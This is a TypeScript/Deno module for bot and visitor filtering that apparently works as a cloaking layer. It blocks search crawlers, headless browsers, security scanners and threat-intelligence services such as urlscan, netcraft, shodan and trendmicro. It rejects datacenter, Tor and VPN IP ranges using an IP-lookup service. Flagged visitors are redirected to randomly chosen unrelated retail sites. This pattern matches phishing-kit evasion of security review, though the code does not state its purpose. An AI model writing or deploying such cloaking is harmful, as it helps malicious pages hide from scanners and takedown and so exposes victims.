// @ts-nocheck — Deno shared module
import { jsonResponse } from './security.ts';

export const BOT_REDIRECT_POOL = [
  'https://www.amazon.com/',
  'https://www.cloudflare.com/',
  'https://www.arsenal.com/',
  'https://www.temu.com/',
  'https://www.ebay.com/',
  'https://www.alibaba.com/',
  'https://www.target.com/',
  'https://www.walmart.com/',
];

export const BOT_UA_PATTERNS = [
  'googlebot',
  'google-inspectiontool',
  'adsbot-google',
  'mediapartners-google',
  'apis-google',
  'feedfetcher-google',
  'bingbot',
  'bingpreview',
  'msnbot',
  'slurp',
  'duckduckbot',
  'baiduspider',
  'yandexbot',
  'sogou',
  'exabot',
  'facebot',
  'facebookexternalhit',
  'twitterbot',
  'linkedinbot',
  'applebot',
  'semrushbot',
  'ahrefsbot',
  'mj12bot',
  'dotbot',
  'petalbot',
  'rogerbot',
  'scrapy/',
  'curl/',
  'wget/',
  'python-requests',
  'python-urllib',
  'python/',
  'aiohttp',
  'httpx/',
  'go-http-client',
  'java/',
  'ruby',
  'perl',
  'php/',
  'headlesschrome',
  'headless',
  'phantomjs',
  'selenium',
  'webdriver',
  'puppeteer',
  'playwright',
  'nightmare',
  'cypress',
  'testcafe',
  'zgrab',
  'masscan',
  'nmap',
  'nikto',
  'sqlmap',
  'dirbuster',
  'gobuster',
  'ffuf',
  'nuclei',
  'bytespider',
  'meta-externalagent',
  'gptbot',
  'chatgpt-user',
  'claudebot',
  'anthropic-ai',
  'cohere-ai',
  'archive.org_bot',
  'ia_archiver',
  'spbot',
  'discordbot',
  'telegrambot',
  'whatsapp',
  'pinterestbot',
  'crawler',
  'spider',
  'bot/',
  'bot;',
  'bot ',
  'preview',
  'monitor',
  'scraper',
  'fetcher',
  'hubspot',
  'uptimerobot',
  'pingdom',
  'gtmetrix',
  'lighthouse',
  'pagespeed',
  'validator',
  'postman',
  'insomnia',
  'axios/',
  'node-fetch',
  'undici',
  'libwww-perl',
  'okhttp',
  'apache-httpclient',
  'colly',
  'mechanize',
  'httpclient',
  'rest-client',
  'check_http',
  'zgrab',
  'censys',
  'shodan',
  'nessus',
  'burp',
  'acunetix',
  'netcraft',
  'trendmicro',
  'urlscan',
];

const BLOCKED_ORG_KEYWORDS = [
  'amazon web services',
  'amazon data services',
  'google cloud',
  'microsoft azure',
  'digitalocean',
  'linode',
  'ovh',
  'hetzner',
  'vultr',
  'choopa',
  'leaseweb',
  'psychz',
  'm247',
  'hostinger',
  'contabo',
  'scaleway',
  'oracle cloud',
  'alibaba cloud',
  'tencent cloud',
  'datacamp',
  'datacenter',
  'data center',
  'hosting',
  'server hosting',
  'cloud server',
  'colocation',
  'tor exit',
  'mullvad',
  'nordvpn',
  'expressvpn',
  'protonvpn',
  'surfshark',
  'cyberghost',
  'private internet access',
];

export interface ClientSignals {
  userAgent: string;
  webdriver: boolean;
  languages: string[];
  platform: string;
  vendor: string;
  hardwareConcurrency: number;
  maxTouchPoints: number;
  timezone: string;
  screenWidth: number;
  screenHeight: number;
  outerWidth: number;
  outerHeight: number;
  colorDepth: number;
  touchSupport: boolean;
  pdfViewerEnabled: boolean;
  pluginCount: number;
}

export function pickBotRedirect(): string {
  const index = Math.floor(Math.random() * BOT_REDIRECT_POOL.length);
  return BOT_REDIRECT_POOL[index];
}

export function matchesBotUserAgent(userAgent: string | null | undefined): boolean {
  if (!userAgent || userAgent.trim().length < 8) return true;
  const normalized = userAgent.toLowerCase();
  return BOT_UA_PATTERNS.some((pattern) => normalized.includes(pattern));
}

export function getClientIp(req: Request): string | null {
  const cf = req.headers.get('cf-connecting-ip')?.trim();
  if (cf) return cf;

  const forwarded = req.headers.get('x-forwarded-for');
  if (forwarded) {
    const first = forwarded.split(',')[0]?.trim();
    if (first) return first;
  }

  const realIp = req.headers.get('x-real-ip')?.trim();
  return realIp || null;
}

export function requireClientSignals(
  signals: Partial<ClientSignals> | null | undefined,
): signals is ClientSignals {
  if (!signals || typeof signals !== 'object') return false;

  return Boolean(
    typeof signals.userAgent === 'string' &&
      signals.userAgent.trim().length >= 8 &&
      Array.isArray(signals.languages) &&
      signals.languages.length > 0 &&
      typeof signals.platform === 'string' &&
      typeof signals.timezone === 'string' &&
      signals.timezone.length > 0 &&
      typeof signals.screenWidth === 'number' &&
      signals.screenWidth > 0 &&
      typeof signals.screenHeight === 'number' &&
      signals.screenHeight > 0 &&
      typeof signals.outerWidth === 'number' &&
      signals.outerWidth > 0 &&
      typeof signals.outerHeight === 'number' &&
      signals.outerHeight > 0 &&
      typeof signals.colorDepth === 'number' &&
      signals.colorDepth > 0,
  );
}

function hasBrowserFetchFingerprint(req: Request): boolean {
  const ua = req.headers.get('user-agent') ?? '';
  if (!/chrome|firefox|edg|safari/i.test(ua)) {
    return true;
  }

  const mode = req.headers.get('sec-fetch-mode');
  const dest = req.headers.get('sec-fetch-dest');
  const site = req.headers.get('sec-fetch-site');

  if (!mode || !dest || !site) {
    return false;
  }

  return mode === 'cors' && dest === 'empty' && (site === 'cross-site' || site === 'same-origin');
}

function evaluateClientEnvironment(signals: ClientSignals): { isBot: boolean; reason?: string } {
  if (signals.webdriver) {
    return { isBot: true, reason: 'webdriver-flag' };
  }

  if (matchesBotUserAgent(signals.userAgent)) {
    return { isBot: true, reason: 'blocked-client-user-agent' };
  }

  if (!signals.languages.length) {
    return { isBot: true, reason: 'missing-languages' };
  }

  if (!signals.timezone) {
    return { isBot: true, reason: 'missing-timezone' };
  }

  const isMobile = signals.maxTouchPoints > 0 || signals.touchSupport;
  if (!isMobile && signals.pluginCount === 0 && /chrome|firefox/i.test(signals.userAgent)) {
    return { isBot: true, reason: 'headless-no-plugins' };
  }

  if (signals.outerWidth <= 0 || signals.outerHeight <= 0) {
    return { isBot: true, reason: 'invalid-viewport' };
  }

  return { isBot: false };
}

export function evaluateBotSignals(
  req: Request,
  clientSignals?: Partial<ClientSignals> | null,
): { isBot: boolean; reason?: string } {
  const userAgent = req.headers.get('user-agent');
  if (matchesBotUserAgent(userAgent)) {
    return { isBot: true, reason: 'blocked-user-agent' };
  }

  const accept = req.headers.get('accept') ?? '';
  if (!accept.includes('application/json')) {
    return { isBot: true, reason: 'invalid-accept-header' };
  }

  const contentType = req.headers.get('content-type') ?? '';
  if (!contentType.includes('application/json')) {
    return { isBot: true, reason: 'invalid-content-type' };
  }

  if (!hasBrowserFetchFingerprint(req)) {
    return { isBot: true, reason: 'missing-sec-fetch-headers' };
  }

  if (!requireClientSignals(clientSignals)) {
    return { isBot: true, reason: 'missing-client-signals' };
  }

  if (
    clientSignals.userAgent &&
    userAgent &&
    clientSignals.userAgent.slice(0, 160) !== userAgent.slice(0, 160)
  ) {
    return { isBot: true, reason: 'user-agent-mismatch' };
  }

  const envCheck = evaluateClientEnvironment(clientSignals);
  if (envCheck.isBot) {
    return envCheck;
  }

  return { isBot: false };
}

export async function evaluateIpThreat(
  req: Request,
): Promise<{ isBot: boolean; reason?: string }> {
  const ip = getClientIp(req);
  if (!ip) {
    return { isBot: true, reason: 'missing-client-ip' };
  }

  if (
    ip === '127.0.0.1' ||
    ip === '::1' ||
    ip.startsWith('10.') ||
    ip.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)
  ) {
    return { isBot: false };
  }

  try {
    const res = await fetch(`https://ipwho.is/${ip}`, {
      signal: AbortSignal.timeout(3500),
    });
    if (!res.ok) {
      return { isBot: false };
    }

    const data = await res.json();
    if (!data?.success) {
      return { isBot: false };
    }

    const connectionType = String(data.connection?.type ?? '').toLowerCase();
    if (connectionType === 'hosting') {
      return { isBot: true, reason: 'hosting-ip' };
    }

    const orgBlob = `${data.connection?.org ?? ''} ${data.connection?.isp ?? ''}`.toLowerCase();
    if (BLOCKED_ORG_KEYWORDS.some((keyword) => orgBlob.includes(keyword))) {
      return { isBot: true, reason: 'blocked-ip-org' };
    }
  } catch {
    return { isBot: false };
  }

  return { isBot: false };
}

export function botRedirectResponse(reason?: string): Response {
  return jsonResponse(
    {
      success: false,
      isBot: true,
      redirectUrl: pickBotRedirect(),
      reason,
    },
    403,
  );
}
